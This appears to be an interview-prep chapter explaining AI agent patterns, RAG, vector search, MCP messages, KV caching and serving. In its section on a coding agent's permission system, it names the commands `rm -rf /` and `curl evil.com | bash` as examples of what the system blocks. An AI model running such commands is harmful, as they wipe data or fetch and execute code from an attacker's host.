"If you can't explain it simply, you don't understand it well enough."

This is the companion to Chapter 8. The diagrams tell you WHAT to draw. This chapter tells you HOW to explain each piece — what's actually happening behind the scenes, step by step, in plain language you can memorize and reproduce in an interview.

---

# Part 1 — How Patterns Actually Work

---

# How the ReAct Loop Works

Every AI agent — Claude Code, ChatGPT with tools, Cursor — runs the same fundamental loop.

Think of it like a developer working through a problem. You don't jump straight to coding. You think: "What do I need to know?" Then you look something up. Then you think: "OK, now I know X. What should I do next?" Then you do it. Then you check: "Did that work?" Repeat until done.

The LLM does exactly this, but instead of "looking things up" and "doing things" with your hands, it calls tools.

**Step by step, what happens on every iteration:**

1. The entire conversation so far (system prompt + user request + all previous tool calls and results) is sent to the LLM.
2. The LLM generates a response. This response is either a final answer OR a tool call.
3. If it's a tool call, the system executes the tool, captures the result, appends it to the conversation, and goes back to step 1.
4. If it's a final answer, the loop ends.

That's it. There's no separate "planning module" or "decision engine." The LLM IS the planner, the reasoner, and the decision-maker. The loop just gives it the ability to take actions and observe results.

**Why this works:** Each time the LLM sees the conversation (including tool results), it has MORE information than before. It's like a human who reads a search result and now knows more. The model's "reasoning" improves with each iteration because the context gets richer.

**Why it sometimes fails:** The context window fills up. After 20 tool calls, the conversation is enormous. The model may "forget" early instructions or get confused by too much information. This is why context management (summarization, pruning) matters.

**The key insight for interviews:** The agent doesn't have a brain separate from the LLM. The LLM IS the brain. The "agentic" part is just the loop that lets it call tools and try again.

---

# How Orchestrator-Worker Differs from a Simple Loop

In a ReAct loop, one agent does everything — it reasons, acts, and observes in a single context window.

In orchestrator-worker, there's a separation: one agent PLANS (the orchestrator), and different agents EXECUTE (the workers).

**Why does this matter?** Because the workers don't share context with each other. Each worker gets ONLY the information it needs for its specific subtask. This means:

1. Workers can run in parallel (they're independent).
2. Workers can use different models (cheap model for simple tasks, expensive for hard ones).
3. Workers don't pollute each other's context (the search worker's results don't confuse the code writer).

**How the orchestrator works internally:**

1. Orchestrator receives the task.
2. Orchestrator calls the LLM with a planning prompt: "Break this task into subtasks."
3. LLM returns a structured plan: [{task: "search docs", agent: "researcher"}, {task: "write code", agent: "coder"}]
4. Orchestrator dispatches each subtask to the appropriate worker.
5. Workers execute independently (possibly in parallel).
6. Workers return results to the orchestrator.
7. Orchestrator calls the LLM again: "Here are the results from all workers. Synthesize a final answer."

**The cost trade-off you must know:** The orchestrator itself is an LLM call. Every worker is an LLM call. So a task that takes 1 LLM call as a single agent now takes 1 (plan) + N (workers) + 1 (synthesis) = N+2 calls. This is why multi-agent systems cost 58-285% more in tokens.

**When the overhead is worth it:** When workers genuinely need different expertise (a code agent shouldn't also be doing financial analysis), when parallel execution saves wall-clock time, or when isolating context prevents cross-contamination of information.

---

# How Reflection Actually Improves Quality

The model generates a draft. Then you feed the draft BACK to the model (same model or different) with a new prompt: "Critique this draft. What's wrong? How can it be improved?"

**What's happening behind the scenes:**

Round 1 (Generation):
```
System: "You are a code reviewer."
User: "Review this function for bugs."
→ LLM generates: "I found 3 issues: ..."
```

Round 2 (Critique):
```
System: "You are a senior reviewer. Critique this review."
User: "Here's the review: [paste Round 1 output]. 
       Is it complete? Did it miss anything? Are any findings wrong?"
→ LLM generates: "The review missed an edge case in line 15..."
```

Round 3 (Revision):
```
System: "You are a code reviewer."
User: "Revise your review based on this feedback: [paste Round 2 output]"
→ LLM generates improved review.
```

**Why this works:** The LLM is better at CRITIQUING than GENERATING on the first try. When you ask "is this correct?", the model catches errors it missed during generation. This is because generation and evaluation are different cognitive tasks — evaluating is easier than creating from scratch.

**Why you MUST cap iterations:** Without a limit, the model can enter a loop where the critic always finds something to improve, and the generator always changes something, and the critic finds a new issue with the change. Set max_iterations = 3. Most improvement happens in round 1-2. Round 3+ has diminishing returns and exploding cost.

---

# How Fan-Out/Fan-In Actually Executes

Imagine you need to research three competing products. Sequentially, that's 3 searches done one after another — total time = 3× one search.

Fan-out runs all three searches simultaneously:

**Step 1 (Fan-Out):** The orchestrator creates 3 independent tasks and dispatches them to 3 workers at the same time using async/parallel execution (Promise.all in JS, asyncio.gather in Python, goroutines in Go).

**Step 2 (Parallel Execution):** All three workers run simultaneously. Each hits different APIs, searches different databases, and returns results independently. Total time ≈ time of the slowest worker (not sum of all three).

**Step 3 (Fan-In):** The merger collects all results. This is where the hard engineering is:
- Deduplication: If two workers found the same article, remove the duplicate.
- Conflict resolution: If Worker A says "price is $100" and Worker B says "price is $120", which is correct? Use source reliability or recency.
- Ranking: Merge results into a single ranked list.
- Synthesis: The LLM reads all merged results and produces one coherent answer.

**The failure handling challenge:** What if Worker 2 times out? Do you wait? Return partial results? Retry? Production systems use timeouts + partial results: if a worker doesn't respond in 5 seconds, proceed with whatever results are available. This is "graceful degradation."

---

# How Swarm Differs from Orchestrator

In an orchestrator system, there's a boss that assigns work: "Agent A, do task 1. Agent B, do task 2."

In a swarm, there's NO boss. Instead, there's a shared task board (like a kanban board). Agents look at the board, pick up tasks they can handle, and mark them as claimed.

**Step by step:**

1. A planner (or human) creates a task list and puts it on the shared board.
2. Agent A checks the board, sees Task 1 is unclaimed, claims it, and starts working.
3. Agent B checks the board, sees Task 1 is claimed (skip), sees Task 2 is unclaimed, claims it.
4. Agent A finishes Task 1, marks it complete, checks for more unclaimed tasks.
5. This continues until all tasks are complete.

**What's the shared board in practice?** A file (like your Seismic tool's tasks.md), a database table, a Redis queue, or any shared state. The key requirement: agents must be able to atomically claim a task (prevent two agents from grabbing the same task).

**Why swarm is risky in production:** No central coordinator means no single place to monitor progress, detect stuck agents, or enforce ordering constraints. If Agent A gets stuck in an infinite loop, nobody notices unless you build health monitoring separately.

---

# Part 2 — How Systems Work Behind the Scenes

---

# How RAG Actually Works (Step by Step)

Forget the diagram. Here's what literally happens when a user asks "What's our refund policy?"

**Offline (happens once, before any user asks anything):**

1. Your company's documents (PDFs, Confluence pages, Slack threads) are loaded.
2. Each document is split into chunks. Not randomly — at semantic boundaries (paragraph breaks, section headers). A 10-page policy document might become 30 chunks of ~200-500 tokens each. Chunks overlap slightly (last 50 tokens of chunk N = first 50 tokens of chunk N+1) to preserve context at boundaries.
3. Each chunk is fed through an embedding model (like OpenAI's text-embedding-3-small). The model converts the text into a vector of numbers — typically 1536 dimensions. This vector captures the MEANING of the chunk, not the exact words.
4. These vectors are stored in a vector database (Qdrant, Pinecone, Weaviate) alongside metadata (source URL, document title, last modified date, department).

**Online (happens for every user query):**

1. User asks: "What's our refund policy?"
2. The query is ALSO converted into a vector using the same embedding model. This gives you a 1536-dimensional vector representing the MEANING of the question.
3. The vector database performs a nearest-neighbor search: "Which stored vectors are closest to this query vector?" It compares using cosine similarity (measures the angle between two vectors — smaller angle = more similar meaning). This returns, say, the top 20 most similar chunks.
4. (Optional) Simultaneously, a keyword search (BM25) finds chunks containing exact words like "refund" and "policy." This catches things vector search might miss (specific product names, error codes, policy numbers).
5. Results from both searches are merged using Reciprocal Rank Fusion (RRF): if a chunk appears at rank 3 in vector search and rank 5 in keyword search, its combined score is 1/3 + 1/5 = higher than a chunk appearing only in one search.
6. (Optional) A reranker (cross-encoder model) re-scores the top 20 results. Unlike the embedding model (which encodes query and document separately), the cross-encoder reads the query AND document together, producing a more accurate relevance score. This is slower but much more precise.
7. Top 5-10 chunks are selected. They're formatted and inserted into the prompt alongside the system instructions and user query.
8. The LLM reads the prompt (including the retrieved chunks) and generates an answer grounded in the retrieved text.
9. Citations are added by mapping which chunks contributed to which parts of the answer.

**Why does retrieval quality matter more than model quality?** If the retrieval step returns the wrong documents, even GPT-4 will generate a wrong answer — it'll just generate a more confident wrong answer. Garbage in, garbage out. This is why engineers spend more time optimizing retrieval (chunking, reranking, hybrid search) than swapping models.

---

# How Vector Search Actually Works (HNSW)

When you have millions of vectors and need to find the 10 most similar to a query, you can't compare against every single one — that would take too long. HNSW (Hierarchical Navigable Small World) is the trick that makes this fast.

**Imagine a city map analogy:**

You want to find the nearest coffee shop to your location. You could check every coffee shop in the city (brute force), but that's slow. Instead:

1. Start with a HIGH-LEVEL map (country level). It shows only major cities. Jump to the nearest major city.
2. Switch to a MEDIUM map (city level). It shows neighborhoods. Jump to the nearest relevant neighborhood.
3. Switch to a DETAILED map (street level). Walk to the exact nearest coffee shop.

HNSW does exactly this with vectors:

- **Layer 3 (sparse):** A few "landmark" vectors with long-range connections. You make big jumps.
- **Layer 2 (medium):** More vectors, shorter connections. You navigate toward the right region.
- **Layer 1 (dense):** Many vectors, very short connections. You find the exact nearest neighbors.

Each layer is a graph where nodes are vectors and edges connect nearby vectors. Search starts at the top layer and "drills down."

**Performance:** For 1 million vectors, brute force = 1M comparisons. HNSW = ~100-200 comparisons. That's 5000x faster. The trade-off: HNSW uses more memory (storing the graph structure) and the search is approximate (might miss the absolute best match in exchange for speed).

---

# How Embedding Actually Works

When the embedding model converts "What's our refund policy?" into a vector like [0.23, -0.41, 0.67, ...], what do those numbers mean?

**Each dimension captures a different aspect of meaning.** One dimension might correlate with "financial concepts," another with "customer service," another with "time-related." The model learns these dimensions during training — they're not hand-designed.

**Similar meanings → similar vectors.** "refund policy" and "return policy" produce vectors that point in nearly the same direction (high cosine similarity). "refund policy" and "machine learning" produce vectors pointing in very different directions (low cosine similarity).

**The math:** Cosine similarity measures the angle between two vectors. cos(0°) = 1.0 (identical), cos(90°) = 0.0 (unrelated). In practice, similar texts score 0.7-0.9, unrelated texts score 0.1-0.3.

**Why this matters for RAG:** When you embed the query and the documents using the same model, similar-meaning text ends up near each other in vector space. Vector search exploits this to find relevant documents without exact keyword matching.

---

# How Mem0's Memory Pipeline Actually Works

When a user says "I'm a senior engineer at Google working on Kubernetes, and I prefer Go over Python," here's what Mem0 actually does:

**Step 1 — Fact Extraction:**
An LLM receives the conversation turn and a prompt like:
```
"Extract distinct facts from this conversation. 
Return each fact as a separate statement."
```
Output:
- "User is a senior engineer"
- "User works at Google"
- "User works on Kubernetes"
- "User prefers Go over Python"

**Step 2 — For each fact, classify the operation:**
Take "User works at Google." Search the vector store for similar existing memories.

Case A: No similar memories found → operation = **ADD**. Store as new memory.

Case B: Found existing memory "User works at Microsoft" → operation = **UPDATE**. Replace old memory with new one. (The user changed jobs.)

Case C: Found existing memory "User works at Google" → operation = **NOOP**. Already known. Skip.

Case D: Found existing memory "User is unemployed" and new fact says "User works at Google" → operation = **DELETE** old memory, **ADD** new one.

**Step 3 — Storage:**
The fact is embedded into a vector and stored in the vector database. If graph mode is enabled, entities and relationships are also extracted: (User) --[works_at]--> (Google) --[project]--> (Kubernetes).

**Step 4 — At query time:**
When the user asks a question in a future session, the system embeds the query, searches the memory store for relevant memories, ranks them by relevance × recency × importance, and injects the top memories into the LLM's context.

**The key insight:** Mem0 doesn't store conversations. It stores FACTS. A 500-message conversation might produce only 20-50 stored facts. This is dramatically more efficient than storing raw chat history.

---

# How MCP Actually Works Behind the Wire

When Claude Desktop calls a GitHub MCP server to create an issue, here's the actual data flowing over the wire:

**Connection Establishment:**

For a local server (like a database tool running on your machine), MCP uses stdio — the host application spawns the server as a child process and communicates through standard input/output. No network involved.

For a remote server (like a cloud-hosted Slack integration), MCP uses HTTP with Server-Sent Events (SSE) for streaming responses, or the newer Streamable HTTP transport.

**The Initialize Handshake:**

Client sends:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "initialize",
  "params": {
    "protocolVersion": "2025-06-18",
    "capabilities": {},
    "clientInfo": {"name": "claude-desktop", "version": "1.0"}
  }
}
```

Server responds:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2025-06-18",
    "capabilities": {"tools": {"listChanged": true}},
    "serverInfo": {"name": "github-server", "version": "1.0"}
  }
}
```

Now both sides know what the other supports. The client asks for the tool list:

```json
{"jsonrpc": "2.0", "id": 2, "method": "tools/list"}
```

Server returns schemas for each tool:
```json
{
  "tools": [{
    "name": "create_issue",
    "description": "Create a GitHub issue",
    "inputSchema": {
      "type": "object",
      "properties": {
        "repo": {"type": "string"},
        "title": {"type": "string"},
        "body": {"type": "string"}
      },
      "required": ["repo", "title"]
    }
  }]
}
```

These schemas are injected into the LLM's context as available tools. When the model decides to call one:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "create_issue",
    "arguments": {"repo": "user/project", "title": "Fix login bug"}
  }
}
```

Server executes, returns result:
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [{"type": "text", "text": "Created issue #42"}]
  }
}
```

**The insight to remember:** MCP is just structured JSON messages over a transport. The "magic" is standardization — every tool describes itself using the same schema format, so any client can discover and use any server. Like how every USB device describes itself to any computer using the same USB descriptor format.

---

# How KV Cache Saves Computation

This is the single most important inference optimization. Here's why.

**Without KV Cache:**

When generating token 100, the model computes attention over ALL 100 previous tokens. When generating token 101, it computes attention over ALL 101 tokens. Every previously computed attention key and value is recalculated from scratch.

Token 1: compute attention for [1] → 1 computation
Token 2: compute attention for [1, 2] → 2 computations
Token 3: compute attention for [1, 2, 3] → 3 computations
...
Token N: compute attention for [1, 2, ..., N] → N computations

Total: 1 + 2 + 3 + ... + N = N²/2 computations. Quadratic growth.

**With KV Cache:**

After computing attention for token 1, store the key and value vectors. When computing token 2, REUSE the stored K/V for token 1, only compute the NEW K/V for token 2.

Token 1: compute K1, V1 → store in cache
Token 2: reuse K1, V1 from cache. Compute only K2, V2 → store
Token 3: reuse K1, V1, K2, V2. Compute only K3, V3 → store

Each token only requires ONE new computation instead of recomputing everything. Total: N computations instead of N²/2. Linear instead of quadratic.

**The trade-off:** KV cache consumes GPU memory. For a 70B parameter model with a 4096-token context, the KV cache alone can consume ~40GB of GPU memory. This is why PagedAttention (vLLM's innovation) matters — it manages this memory efficiently using the virtual memory paging trick.

---

# How Continuous Batching Works

**Fixed batching (the old way):**

Wait for 8 requests to arrive. Process all 8 together. Some finish after 50 tokens, some after 500 tokens. The GPU WAITS for the slowest request before starting a new batch. Fast requests waste GPU time waiting.

```
Time →
GPU: [Batch 1: R1 R2 R3 R4 R5 R6 R7 R8] [wait..] [Batch 2: ...]
     R1 done ──────────────┐
     R2 done ──┐           │
               │  GPU sits  │ ← wasted
               │  idle here │
     R8 done ──────────────┘
```

**Continuous batching (the modern way):**

Requests join and leave the batch dynamically. When R2 finishes (short answer), its slot is immediately filled by R9 (new arrival). The GPU never sits idle.

```
Time →
GPU: [R1 R2 R3 R4 R5 R6 R7 R8]
         R2 done → [R1 R9 R3 R4 R5 R6 R7 R8]  ← R9 joins
     R5 done → [R1 R9 R3 R4 R10 R6 R7 R8]     ← R10 joins
```

**Result:** GPU utilization goes from ~30-50% (fixed) to ~80-95% (continuous). Throughput doubles or triples. This is why vLLM massively outperforms naive serving.

---

# How Reranking Improves Retrieval

Initial retrieval (vector search + BM25) is FAST but ROUGH. It uses bi-encoders — the query and document are encoded separately, then compared by vector distance. This means the model never "reads" the query and document together.

A reranker uses a cross-encoder — it reads the query AND the document TOGETHER as one input, and outputs a single relevance score. This is dramatically more accurate because the model can understand the relationship between query and document at the word level.

**Example:**

Query: "How to handle authentication errors in the API?"

Bi-encoder retrieval returns:
1. "API Authentication Guide" (score: 0.89) ← talks about setting up auth, not errors
2. "Error Handling Best Practices" (score: 0.85) ← talks about errors generally, not auth
3. "Troubleshooting Auth Failures" (score: 0.82) ← exactly what the user needs

Cross-encoder reranking reads each doc WITH the query and rescores:
1. "Troubleshooting Auth Failures" (score: 0.95) ← promoted to #1
2. "API Authentication Guide" (score: 0.72) ← demoted
3. "Error Handling Best Practices" (score: 0.68) ← demoted

**Why not use cross-encoders for everything?** They're 100x slower than bi-encoders. Cross-encoding 1 million documents would take minutes. So you use bi-encoders to quickly narrow to top 20, then cross-encode only those 20. Speed of bi-encoder + accuracy of cross-encoder.

---

# How Confidence Gating Works in Customer Support

The AI generates a response AND a confidence score. If confidence is below a threshold, the system escalates to a human instead of sending a potentially wrong answer.

**How confidence is estimated (since LLMs don't natively output calibrated confidence):**

Method 1 — **Consistency sampling:** Ask the model the same question 5 times with temperature > 0. If 4/5 responses say the same thing, confidence ≈ 80%. If all 5 differ, confidence is low.

Method 2 — **Self-reported:** Ask the model to rate its own confidence: "On a scale of 0-1, how confident are you?" Unreliable alone but useful as a signal.

Method 3 — **Source grounding check:** If the model's answer is fully supported by retrieved documents, confidence is high. If the model is "going beyond" what the documents say, confidence is lower.

**The threshold trade-off:**

Threshold = 0.95: Almost everything escalates to humans. High quality, but defeats the purpose of automation.
Threshold = 0.50: Almost nothing escalates. Fast, but too many bad answers reach customers.
Sweet spot is typically 0.80-0.85 for most customer support, tuned based on the cost of a wrong answer vs the cost of human handling.

---

# How the Claude Code Permission System Works

Claude Code needs to run bash commands, edit files, and execute code on YOUR machine. But you don't want it to `rm -rf /` or `curl evil.com | bash`. The permission system is what makes autonomous agents safe.

**Three-tier pipeline:**

1. **.claude/rules** (project-level): A file in the repo that says things like "Never modify database migration files" or "Always run tests after editing." These are static rules checked first.

2. **Tool logic** (tool-level): Each tool has built-in safety. The Bash tool knows that `rm -rf /` is dangerous. The Edit tool validates that the file exists before editing. These are coded into the tool implementations.

3. **Mode + classifier** (runtime): Different modes (normal, autonomous) have different permission levels. A classifier decides if an action is safe, risky, or dangerous. Safe actions auto-approve. Risky actions show a prompt: "Claude wants to run `npm install`. Allow?" Dangerous actions are blocked entirely.

**The architectural insight:** The MODEL decides what to attempt. The TOOL SYSTEM decides what is permitted. These are separate responsibilities. The model can "want" to delete a file, but the permission pipeline can deny it. This separation is what makes the system trustworthy.

---

# Part 3 — How to Explain These in an Interview

---

# The 60-Second Explanation Framework

For any system, be ready to explain it in 60 seconds using this structure:

1. **One sentence: what it does** (user's perspective)
2. **One sentence: why the naive approach fails**
3. **The key architectural insight** (what makes it work)
4. **The main trade-off**

**Example — RAG:**
"RAG lets an LLM answer questions using external documents it wasn't trained on. The naive approach — stuffing everything into the prompt — fails because context windows are limited and most information is irrelevant. The key insight is using vector similarity to find the few most relevant chunks from millions of documents, then giving only those to the model. The trade-off is that retrieval quality determines answer quality — a perfect model can't fix bad retrieval."

**Example — KV Cache:**
"KV Cache stores previously computed attention keys and values so they don't get recomputed for every new token. Without it, generating each token requires reprocessing the entire sequence — that's quadratic cost. With caching, each new token only needs one new computation — linear cost. The trade-off is GPU memory — the cache itself can consume tens of gigabytes for long sequences."

**Example — MCP:**
"MCP standardizes how AI apps connect to external tools, solving the N×M integration problem — instead of every app building custom connectors for every tool, both sides implement one standard protocol. It works like LSP does for code editors — a GitHub MCP server works with Claude, Cursor, and any MCP-compatible app without changes. The trade-off is that standardization adds a protocol layer, and the auth story is still maturing."

**Example — Multi-Agent vs Single Agent:**
"Multi-agent uses specialized agents for different subtasks instead of one agent doing everything. The motivation is that a single prompt can't be expert at research AND coding AND review simultaneously. The key insight is that separating concerns lets you use different models, parallelize work, and keep contexts focused. The trade-off is 58-285% token overhead from coordination — so only use it when specialization genuinely improves output."

---

# How to Answer "Design X" in an Interview

**Step 1 — Clarify (30 seconds):**
"Who are the users? How many? What's the latency target? What data sources? What's the quality bar? Any compliance requirements?"

**Step 2 — Start Simple (draw this first):**
```
User → Gateway → [Core Logic] → LLM → Response
```

**Step 3 — Add components only as requirements demand:**
- "We need external knowledge" → add Retrieval
- "Users expect personalization" → add Memory
- "Need real-world actions" → add Tools
- "Complex multi-step tasks" → add Planner
- "Quality critical" → add Reflection/Critic
- "Multiple domains" → add Multi-Agent
- "High stakes" → add Human-in-the-Loop

**Step 4 — Call out trade-offs as you draw:**
"I'm adding a reranker here. It adds ~200ms latency but significantly improves retrieval precision. For this use case, quality matters more than speed, so that's an acceptable trade-off."

**Step 5 — Add production concerns:**
- "Observability: trace ID on every request, latency per component"
- "Security: auth at gateway, PII filtering on output"
- "Cost: semantic cache for repeated queries, model routing for simple vs complex"
- "Failure handling: retry with backoff, fallback model if primary times out"

**Step 6 — State what you'd measure:**
"I'd evaluate retrieval quality with precision/recall, output quality with faithfulness score, and monitor p95 latency, cost per request, and hallucination rate."

**The biggest mistake people make:** Drawing the most complex architecture they can think of. Interviewers are looking for judgment — knowing when NOT to add a component is more impressive than knowing all the components.
